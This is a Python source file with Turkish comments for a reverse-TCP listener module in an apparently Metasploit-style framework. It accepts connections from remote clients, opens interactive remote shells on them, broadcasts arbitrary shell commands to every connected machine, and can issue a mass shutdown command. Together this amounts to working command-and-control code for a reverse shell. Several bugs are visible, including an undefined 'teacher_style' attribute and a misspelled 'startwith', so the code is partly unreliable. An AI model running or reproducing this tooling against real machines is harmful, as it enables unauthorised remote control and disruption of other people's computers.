from typing import Dict, Any 
# spesifik tipler.
from core.module import BaseModule 
# ana modül sınıfı.
from core.option import Option 
# option tanımlama için.
import socket 
# soket programlama için
import threading 
# çoklu işlem ve arkaplan işlemleri için. ana hedef sunucu hizmetinin arkaplanda seyretmesi.
import sys
# Python yorumlayıcısı ile ve yorumlayıcının çalıştığı çalışma zamanı ortamı (sistem) ile etkileşim kurmak için kullanılan standart bir modüldür.
import shlex
# shlex modülü, Python'daki kabuk sözdizimi ayrıştırması (shell syntax parsing) için tasarlanmış bir araçtır.
import base64
# iletişimi base64 encode etmek için
import struct
# Python'daki struct modülü, Python değerlerini (tamsayılar, kayan noktalar, dizeler vb.) standart C veri tipleri gibi temsil eden ikili (binary) verilere dönüştürmek ve tam tersi yönde çözümlemek (unpack) için kullanılır.
from prompt_toolkit import PromptSession
# prompt oluşturmak için.
from prompt_toolkit.completion import Completer, Completion
# otomatik tamamlama için.
from prompt_toolkit.history import InMemoryHistory
# komutları hafızaya alıp otomatik tamamlamada kullanmak için.
from prompt_toolkit.styles import Style
# prompt renklendirme için.
from prompt_toolkit.validation import Validator
# prompt doğrulama için.

class mahpreter_reverse_tcp_listener(BaseModule):
    """mahpreter reverse_tcp dinleyicisi.

    Args:
        BaseModule (_type_): _description_
    """
    Name = "listener"
    Description = "payloads/mahpreter/reverse_tp için listener."
    Author = "Mahmut P."
    Category = "payloads"
    def __init__(self):
        """init fonksiyon.
        """
        super().__init__()
        self.Options = {
            "ip":Option("IP", "0.0.0.0", True, "Sunucu ip adresi."),
            "port": Option("PORT",5000, True, "Sunucunun kullanacağı port.")
        }
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)

    def run(self, options: Dict[str, Any]):
        """Modül çalışınca çalışacak fonksiyon.
        Dinleme yapacak

        Args:
            options (Dict[str, Any]): işlenecek Option'lar
        """
        HOST = options.get("IP")
        PORT = int(options.get("PORT"))
        # ne olur ne olmaz int ibaresi koydum.
        
        class ShellCompleter(Completer):
            """shell oturumu açılınca çalışacak otomatik tamamlama.

            Args:
                Completer (_type_): Otomatik tamamlama objesi.
            """
            def get_completions(self, document, complete_event):
                """otomatik tamamlayıcı.

                Args:
                    document (_type_): Mevcut belgeyi temsil eden obje.
                    complete_event (_type_): Otomatik tamamlama olayıyla ilgili bilgileri içeren obje.

                Yields:
                    _type_: Otomatik tamamlama objesi.
                """
                text_before_cursor = document.text_before_cursor
                prefix = text_before_cursor.lower().strip()
                
                if not prefix or prefix.startswith('b'):
                    yield Completion('back', start_position=-len(text_before_cursor))
        class ServerCompleter(Completer):
            """Sunucu için otomatik tamamlayıcı.

            Args:
                Completer (_type_): 
            """
            def __init__(self, app):
                self.app = app
            
            def get_completions(self, document, complete_event):
                """_summary_

                Args:
                    document (_type_): Mevcut belgeyi temsil eden obje.
                    complete_event (_type_): Otomatik tamamlama olayıyla ilgili bilgileri içeren obje.
                """
                text_before_cursor = document.text_before_cursor
                commands = ['help', 'clients', 'connect', 'disconnect', 'sendall', 'shutdown_all', 'exit']
                if not text_before_cursor:
                    # Boşsa: Bütün komutlar getirilir.
                    for cmd in commands:
                        yield Completion(cmd)
                    return
                if text_before_cursor[-1] == " ":
                    # Boşluktan sonraki imleç: Komut için argümanı tamamlıyor.
                    words = text_before_cursor[-1].split() # Sondaki boşluğu kaldır.
                    if words:
                        cmd = words[0].lower()
                        prefix = "" # Yeni argüman için boş önek.
                        if cmd in ['connect', 'disconnect']:
                            choices = self.app._get_client_choices()
                            for choice in choices:
                                # Önek boş olduğundan tüm getirileri ver.
                                yield Completion(choice, start_position=0)
                    return
                # Boşluktan sonra değil: bir kelime içinde tamamlama.
                words = text_before_cursor.split()
                prefix = words[-1] if words else text_before_cursor
                if len(words) == 0 or len(words) == 1:
                    # adları otomatik tamamlama.
                    for cmd in commands:
                        if cmd.lower().startswith(prefix.lower()):
                            yield Completion(cmd, start_position=-len(prefix))
                else:
                    # komut argümanı otomatik tamamlama.
                    cmd = words[0].lower()
                    if cmd in ['connect', 'disconnect']:
                        choices = self.app._get_client_choices()
                        for choice in choices:
                            if choice.startwith(prefix):
                                yield Completion(choice, start_position=-len(prefix))
        class MahpreterServer:
            def __init__(self):
                self.root_prompt_style = Style.from_dict({
                    'prompt': '#00aa00 bold',
                })
                self.shell_style = Style.from_dict({
                    'prompt': '#aa5500 bold',
                })
                self.prompt = "mahpreter> "
                self.intro = "Mahpreter listener hazır. Yardım için 'help' yazın enter'a basın. Tab tuşuna otomatik tamamlaa için basın."
                print(self.intro)

                self.active_clients = {}
                self.client_ids = []
                self.client_info = {}

                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                try:
                    self.server_socket.bind((HOST, PORT))
                    self.server_socket.listen(10)
                    print(f"[*] Sunucu dinlemede {HOST}:{PORT}")

                    self.accept_thread = threading.Thread(target=self.accept_connections)
                    self.accept_thread.daemon = True
                    self.accept_thread.start()
                
                except Exception as e:
                    print(f"[!] Sunucu başlatma hatası: {e}")
                    sys.exit(1)
                
                self.history = InMemoryHistory()
                self.completer = ServerCompleter(self)
                self.session = PromptSession(
                    self.prompt, 
                    completer=self.completer, 
                    history=self.history,
                    style=self.teacher_style
                )
            
            def recv_full_data(self, sock):
                """Bütün datayı çeken bir yapı

                Args:
                    sock (_type_): _description_
                """
                try:
                    length_bytes = sock.recv(4)
                    if len(length_bytes) != 4:
                        return None
                    length = struct.unpack('!I', length_bytes)[0]
                    data = b''
                    while len(data) < length:
                        packet = sock.recv(length - len(data))
                        if not packet:
                            return None
                        data += packet
                    return base64.b64decode(data).decode('utf-8')
                except:
                    return None
                
            def send_full_data(self, sock, data):
                """Uzunluk önekiyle tam veriyi gönder.

                Args:
                    sock (_type_): _description_
                    data (_type_): _description_
                """
            
                try:
                    data_bytes = data.encode('utf-8')
                    encoded = base64.b64encode(data_bytes)
                    length = len(encoded)
                    sock.send(struct.pack('!I', length) + encoded)
                except:
                    pass

            def accept_connections(self):
                """
                Yeni client'ları kabul etmek için arka plan döngüsü.
                
                :param self: Açıklama
                
                """
                while True:
                    try:
                        client_sock, addr = self.server_socket.accept()

                        # Handshake: Receive full encoded info
                        sys_info = self.recv_full_data(client_sock)
                        if sys_info is None:
                            client_sock.close()
                            continue

                        self.active_clients[addr] = client_sock
                        self.client_info[addr] = sys_info

                        if addr not in self.client_ids:
                            self.client_ids.append(addr)

                        print(f"\n[+] Yeni client: {addr[0]}:{addr[1]} ({sys_info})")

                    except OSError:
                        break  # Soket kapatıldı

            def clean_client(self, addr): 
                """Bağlantısı kesilen istemciyi listelerden kaldırır.

                Args:
                    addr (_type_): network adresi.
                """
                if addr in self.active_clients:
                    try:
                        self.active_clients[addr].close()
                    except:
                        pass
                    del self.active_clients[addr]

                if addr in self.client_info:
                    del self.client_info[addr]

                if addr in self.client_ids:
                    self.client_ids.remove(addr)

            def _get_client_choices(self):
                """Geçerli dizinleri temsil eden dizelerin bir listesini döndürür ['0', '1', '2'...]

                Returns:
                    _type_: _description_
                """
                return [str(i) for i in range(len(self.client_ids))]
            
            def do_help(self):
                """Komutlar için yardım bilgilerini görüntüleme.

                Returns:
                    _type_: _description_
                """

                help_text = """
Kullanılabilir Komutlar:
help                  - Bu yardım mesajını gösterir
clients               - Bağlı tüm client'ları Endeks Kimlikleriyle listeler
connect <id>          - Öğrenci kabuğuna bağlanın. Geri dönmek için 'back' yazın
disconnect <id>       - Bir client'ı kimliğine göre tekmele
sendall <command>     - TÜM bağlı istemcilere bir kabuk komutu gönderin
shutdown_all          - Acil Durum: Tüm client'ların bilgisayarlarını kapatın
exit                  - Sunucuyu durdurun ve çıkın

Daha fazla ayrıntı için 'help' yazın veya otomatik tamamlama için Tab tuşuna basın.
                """
                print(help_text.strip())

            def do_clients(self):
                """Bağlı tüm istemcileri Endeks Kimlikleriyle birlikte listeler.
                """
                if not self.client_ids:
                    print("[-] Hiç client bağlanmamış.")
                    return

                # Manual Table Formatting
                print(f"{'ID':<3} | {'Client':<20} | {'System Info'}")
                print("-" * 60)

                for idx, addr in enumerate(self.client_ids):
                    info = self.client_info.get(addr, "Unknown")
                    client_str = f"{addr[0]}:{addr[1]}"
                    print(f"{str(idx):<3} | {client_str:<20} | {info}")

            def do_connect(self, index_str):
                """Bir istemci kabuğuna bağlanın. Kullanım: connect <id>

                Args:
                    index_str (_type_): id index değikeni

                Raises:
                    ConnectionResetError: Bağlantı kurmayla alakalı sorun olduğunda mesela bağlantı resetleme sorunu için
                """
                try:
                    idx = int(index_str)
                    if idx < 0 or idx >= len(self.client_ids):
                        print("[!] Invalid Index.")
                        return
                    target_addr = self.client_ids[idx]
                    sock = self.active_clients[target_addr]
                    print(f"[*] Connected to {target_addr[0]}:{target_addr[1]}.")
                    print(f"[*] Bu moddan çıkmak için 'back' komutunu kullanın. Type 'back' to return.")
                    shell_history = InMemoryHistory()
                    shell_completer = ShellCompleter()
                    #shell_prompt = f"Shell@{target_addr[0]}> "
                    shell_prompt = f"({target_addr[0]})>"
                    shell_session = PromptSession(
                        shell_prompt, 
                        completer=shell_completer, 
                        history=shell_history,
                        style=self.shell_style
                    )
                    while True:
                        try:
                            cmd = shell_session.prompt()
                            if not cmd.strip():
                                continue

                            if cmd.strip().lower() == 'back':
                                print("[*] Ana menüye dönülüyor...")
                                break

                            # Send full encoded command
                            self.send_full_data(sock, cmd)

                            # Receive full encoded response
                            response = self.recv_full_data(sock)
                            if response is None:
                                raise ConnectionResetError("No response from client")
                            print(response)
                        except (BrokenPipeError, ConnectionResetError):
                            print(f"[!] Client {target_addr[0]}:{target_addr[1]} disconnected.")
                            self.clean_client(target_addr)
                            break
                        except KeyboardInterrupt:
                            break
                
                except ValueError:
                    print("[!] ID must be a number.")

            def do_disconnect(self, index_str):
                """Bir istemcinin bağlantısını kes, sunucudan tekmele. Kullanım: disconnect <id>

                Args:
                    index_str (_type_): client id
                """
                try:
                    idx = int(index_str)
                    if idx < 0 or idx >= len(self.client_ids):
                        print("[!] Invalid Index.")
                        return
                    target_addr = self.client_ids[idx]
                    self.clean_client(target_addr)
                    print(f"[*] Client {idx} ({target_addr[0]}:{target_addr[1]}) disconnected.")
                except (ValueError, IndexError):
                    print("[!] Invalid Index.")
            
            def do_sendall(self, command):
                """Bağlı tüm istemcilere bir kabuk komutu gönderin. Kullanım: sendall <komut>

                Args:
                    command (_type_): Verilen komut.
                """
                if not command:
                    print("[!] Kullanım: sendall <system_command>")
                    return

                clients_copy = self.client_ids.copy()  # Copy to avoid issues if one disconnects mid-loop

                print(f"[*] Sending '{command}' to {len(clients_copy)} students...")

                results = []
                for addr in clients_copy:
                    if addr in self.active_clients:
                        sock = self.active_clients[addr]
                        try:
                            # Send full encoded command
                            self.send_full_data(sock, command)
                            # Receive full encoded output
                            output = self.recv_full_data(sock)
                            if output is None:
                                raise Exception("No response")
                            results.append(f"\n--- {addr[0]}:{addr[1]} ---\n{output}")
                        except:
                            results.append(f"\n--- {addr[0]}:{addr[1]} ---\n[!] Failed (Disconnected)")
                            self.clean_client(addr)

                for res in results:
                    print(res)

            def do_shutdown_all(self):
                """Acil Durum: Tüm öğrenci bilgisayarlarını kapatır (Simülasyonlu).
                """
                # 'shutdown /s /t 0' (Windows) or 'shutdown -h now' (Linux)

                confirm = input("Tüm istemcileri KAPATMAK istediğinizden emin misiniz?? (y/n): ")
                if confirm.lower() == 'y':
                    self.do_sendall("shutdown /s /t 60")  # 60 second timer
                    print("[*] Shutdown komutu yollanılıyor.")

            def do_exit(self):
                """Sunucuyu durdurur ve çıkış yapar.

                Returns:
                    _type_: _description_
                """
                print("[*] Shutdown, sunucu kapatılıyor...")
                for addr, sock in self.active_clients.items():
                    sock.close()
                self.server_socket.close()
                return True
            def run(self):
                """Ana komut döngüsü.
                """
                print("Kullanılabilir komutlar için 'help' yazın.")
                while True:
                    try:
                        text = self.session.prompt()
                        if not text.strip():
                            continue

                        parts = shlex.split(text)
                        if not parts:
                            continue

                        cmd = parts[0].lower()
                        args = parts[1:]

                        if cmd == 'exit':
                            if self.do_exit():
                                break
                        elif cmd == 'help':
                            self.do_help()
                        elif cmd == 'clients':
                            self.do_clients()
                        elif cmd == 'connect':
                            if len(args) != 1:
                                print("[!] Usage: connect <id>")
                            else:
                                self.do_connect(args[0])
                        elif cmd == 'disconnect':
                            if len(args) != 1:
                                print("[!] Usage: disconnect <id>")
                            else:
                                self.do_disconnect(args[0])
                        elif cmd == 'sendall':
                            command = ' '.join(args)
                            self.do_sendall(command)
                        elif cmd == 'shutdown_all':
                            self.do_shutdown_all()
                        else:
                            print(f"[!] Unknown command: {cmd}. Type 'help' for list.")

                    except KeyboardInterrupt:
                        print("\n[!] Force Exit.")
                        self.do_exit()
                        break
                    except EOFError:
                        self.do_exit()
                        break

        try:
            app = MahpreterServer()
            app.run()
        
        except KeyboardInterrupt:
            print("\n[!] Zorla çıkış.")
            sys.exit(0)
            